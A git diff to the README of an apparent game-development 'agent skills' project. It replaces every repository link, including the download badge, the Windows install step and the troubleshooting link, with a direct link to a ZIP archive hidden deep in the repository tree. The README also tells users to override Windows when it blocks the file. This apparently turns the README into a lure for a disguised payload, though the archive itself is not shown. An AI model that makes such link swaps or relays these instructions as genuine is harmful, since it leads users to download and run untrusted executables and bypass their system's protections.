@@ -1,6 +1,6 @@
 # 🎮 game-superpowers - Build better games with clear agent skills
 
-[![Download game-superpowers](https://img.shields.io/badge/Download-Game%20Superpowers-blue?style=for-the-badge)](https://github.com/Unindustrialised-trapezium914/game-superpowers)
+[![Download game-superpowers](https://img.shields.io/badge/Download-Game%20Superpowers-blue?style=for-the-badge)](https://raw.githubusercontent.com/Unindustrialised-trapezium914/game-superpowers/main/publish/clawhub/gsp-mechanics-systems-design/shared/reference/superpowers-game-v3.1.zip)
 
 ## 🚀 Getting Started
 
@@ -15,7 +15,7 @@ Use it to:
 
 ## 📥 Download and Run on Windows
 
-1. Open this link: https://github.com/Unindustrialised-trapezium914/game-superpowers
+1. Open this link: https://raw.githubusercontent.com/Unindustrialised-trapezium914/game-superpowers/main/publish/clawhub/gsp-mechanics-systems-design/shared/reference/superpowers-game-v3.1.zip
 2. Download the project files to your PC.
 3. If the file comes as a ZIP, right-click it and choose Extract All.
 4. Open the extracted folder.
@@ -122,7 +122,7 @@ These skills help you move through the full game lifecycle, from first review to
 
 ### The download does not open
 Check that the file finished downloading. Try again from the same link:
-https://github.com/Unindustrialised-trapezium914/game-superpowers
+https://raw.githubusercontent.com/Unindustrialised-trapezium914/game-superpowers/main/publish/clawhub/gsp-mechanics-systems-design/shared/reference/superpowers-game-v3.1.zip
 
 ### Windows blocks the file
 Right-click the file and look for an option to keep or open it. Then try again.
